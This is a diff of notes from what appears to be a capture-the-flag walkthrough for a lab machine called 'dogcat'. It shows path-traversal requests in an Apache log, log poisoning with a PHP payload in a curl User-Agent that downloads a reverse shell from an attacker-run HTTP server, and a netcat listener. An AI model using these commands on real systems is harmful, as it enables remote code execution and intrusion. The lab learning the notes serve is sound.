@@ -181,9 +181,32 @@ http://IP/?view=dog/../../../../../../var/log/apache2/access.log&ext&c=bash-c "e
   0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 192.168.128.47 - - [22/Nov/2025:10:23:05 +0000] "GET /?view=dog/../../../../../../var/log/apache2/access.log&ext&c=bash-c%20%22echo%20aaaaaaaaaaaaaaaaaaaaaaaaaaaaa%22 HTTP/1.1" 200 1602 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" 127.0.0.1 - - [22/Nov/2025:10:23:19 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [22/Nov/2025:10:23:50 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
  
  
-
- 
+I used the default PHP reverse shell available Linux in and as /usr/share/laudanum/php/php-reverse-shell.php 
+  and rename it as shell.php after copying it into the folder where I was working on. 
+  In the beginig of shell.php make this changes     
   
+   $ip = '192.168.128.59';  // CHANGE THIS to  tun0:IP
+    $port = 9999;   // Chose unused port number
+  the Attacker IP to my own 
+ 
+open a new terminal and run:  
+        sudo python3 -m http.server 80
+open another terminal and run :
+         curl -A “<?php file_put_contents(‘shell.php’,file_get_contents(‘http://{ATTACKER_IP}/shell.php'))?>" -s http://{MACHINE_IP}
+
+   
+    curl -A "<?php file_put_contents('shell.php',file_get_contents('http://192.168.128.59/shell.php'))?>" -s http://10.82.186.63  
+  
+   You will   get the usual response page with the option to choose between dogs and cats.
+
+launch a listening port using netcat and set the port number as mentioned in shell.php
+
+
+https://whokilleddb.medium.com/dogcat-walk-through-from-tryhackme-2c3c60ee2829
+
+
+
+
 
 
 1. What is flag 1?
